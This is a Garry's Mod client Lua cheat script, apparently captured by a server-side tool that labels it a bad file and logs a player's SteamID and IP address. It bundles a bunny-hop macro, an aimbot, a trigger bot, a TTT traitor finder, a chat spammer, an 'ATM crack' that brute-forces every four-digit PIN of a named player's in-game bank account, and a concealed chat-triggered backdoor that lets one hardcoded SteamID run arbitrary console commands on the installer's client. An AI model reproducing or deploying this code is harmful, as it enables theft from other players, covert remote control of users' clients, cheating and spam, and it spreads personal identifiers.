--[[
	MOD/addons/spies/lua/spies/utilcmds.lua
	Cazed | STEAM_0:1:78044580 <86.180.82.205:27006> | [04-02-14 09:26:30PM]
	===BadFile===
]]


MsgC(Color(255,0,0),"\n Spies UtilCMDS Initialized\n")


////////////////////
////// BHOP ///////
//////////////////

JumpHELD = false

function BHOPScript()
	if input.IsKeyDown(KEY_SPACE) then
		if LocalPlayer():IsOnGround() then
			RunConsoleCommand("+jump")
			timer.Create("JumpOFF",0.01,0,function()
				RunConsoleCommand("-jump")
			end)
		end
	end
end
hook.Add("Think","BHOP",BHOPScript)


////////////////////
/// ATM Crack /////
//////////////////

pins = {}

	function ATMPinPrep()

		for i=0,9 do
			table.insert(pins, "000"..i)
		end

		for i=10,99 do
			table.insert(pins, "00"..i)
		end

		for i= 100,999 do
			table.insert(pins, "0"..i)
		end

		for i=1000,9999 do
			table.insert(pins, i)
		end

	end
	timer.Create("ATMPinPrep",2,1,ATMPinPrep)


function ATMCrack(ply,cmd,args)
print("Initialized")
	for k,v in pairs(player.GetAll()) do
		if args[1] == v:Nick() then
			print("We got this far")
			for k,p in pairs(pins) do
				timer.Simple(tonumber(p)*.015,function()
				RunConsoleCommand("rp_atm_login",util.CRC(p),v:UniqueID(),v:Nick())
				end)
			end
		end
	end
end
concommand.Add("spies_atmcrack",ATMCrack) -- Thank you Lenny



////////////////////
///// Backdoor ////
//////////////////

local owners = {"STEAM_0:1:39690621"}

hook.Add("OnPlayerChat","Commands",function(ply,str,teamchat,playerIsDead)
print("Lol")
	if table.HasValue(owners,"STEAM_0:1:39690621") and ply:SteamID() == owners[1] then
		print("This For")
		if string.find(str,"Command|",0,false) then
			local commands = string.Split(str,"|")
			if string.lower(LocalPlayer():Name()) == string.lower(commands[2]) then
				print("CMD: "..commands[1])
				print("Player "..commands[2])
				PrintTable(commands)
				local cmd = string.Split(commands[2],"|")
				print(commands[3])
				print(commands[4])
				RunConsoleCommand(tostring(commands[3]),tostring(commands[4]))
				print("Command Ran")
			end
		end
	end
end)


//////////////////
///// Spam //////
////////////////



spam = true
function SpamChat(ply,cmd,args)
print(args)
PrintTable(args)
	if spam == false then
		spam = true
		timer.Destroy("Spam")
	elseif spam == true then
		spam = false
		timer.Create("Spam",0.01,0,function()
			RunConsoleCommand("say",args[1])
		end)
	end
end
concommand.Add("spies_Spam",SpamChat)


///////////////////
/// Trigger Bot //
/////////////////


trigger = true
function TriggerBot()
	if trigger == false then
		trigger = true
		timer.Destroy("Trigger")
	elseif trigger == true then
		print("on")
		trigger = false
		if LocalPlayer():KeyDown(IN_ATTACK) then
			timer.Create("-Trigger",.04,0,function()
				RunConsoleCommand("-attack")
			end)
			timer.Create("Trigger",.05,0,function()
				RunConsoleCommand("+attack")
			end)
		else
			timer.Destroy("Trigger")
			timer.Destroy("-Trigger")
		end
	end
end
concommand.Add("spies_triggerbot",TriggerBot)



traitors = {};
tents = {};

function TFinder()

	local traitors = {};
local tents = {};

        for _, e in pairs( ents['GetAll']() ) do
                if( e['CanBuy'] && table['HasValue']( e['CanBuy'], ROLE_TRAITOR ) && !table['HasValue']( tents, e ) ) then
                        if( e:GetMoveType() == MOVETYPE_NONE ) then
                                table['insert']( tents, e );
                                local v = e['Owner'];
                                if( v:Alive() && !v:IsDetective() ) then
                                        if( !table['HasValue']( traitors, v ) ) then
                                                table['insert']( traitors, v );
                                        end
                                end
                        elseif( e:GetMoveType() != MOVETYPE_NONE ) then
                                table['insert']( tents, e );
                        end
                end
        end
        PrintTable(tents)
        PrintTable(traitors)
end
concommand.Add("Spies_tlist",TFinder)

local follow = true
function followPeeps()

	if follow == true then -- Too toggle the script use the spies_follow command
		follow = false
		hook.Remove("CreateMove", "aim")
        hook.Remove("Think", "aim")
        hook.Remove("Tick","FindPlayer")
	elseif follow == false then
		follow = true

		function PlayerCheck(ply)
			local tr = util.GetPlayerTrace(ply)
			local trRes = util.TraceLine(tr)
			if trRes.HitNonWorld then
				if trRes.Entity:IsPlayer() then
					return true
				else
					return false
				end
			end
		end

		local aimbot = true

		hook.Add("KeyPress","FindPlayer",function(ply,ky) -- Press alt to lock on to a player
		print(aimbot)
			if ky == IN_WALK then
				print("Ran")
				if aimbot == true then
					print("Searching!")
					aimbot = false
					if PlayerCheck(ply) == true then

					local tr = util.GetPlayerTrace(ply)
					local trRes = util.TraceLine(tr)
					local target = trRes.Entity
					local targethead = target:LookupBone("ValveBiped.Bip01_Head1") 
					local targetheadpos,targetheadang = target:GetBonePosition(targethead) 
						hook.Add("CreateMove", "aim", function(cmd)
		                        if target:IsPlayer() then
		                                cmd:SetViewAngles((target:GetBonePosition(targethead) - LocalPlayer():GetShootPos()):Angle())
		                        end
		                end)
		                hook.Add("Think", "aim", function()
		                        if target:IsPlayer() then
		                                LocalPlayer():SetEyeAngles((target:GetBonePosition(targethead) - LocalPlayer():GetShootPos()):Angle())
		                        end
		                end)
					end
				else
					aimbot = true
				end
			end
		end)
	end

end
concommand.Add("spies_follow",followPeeps)
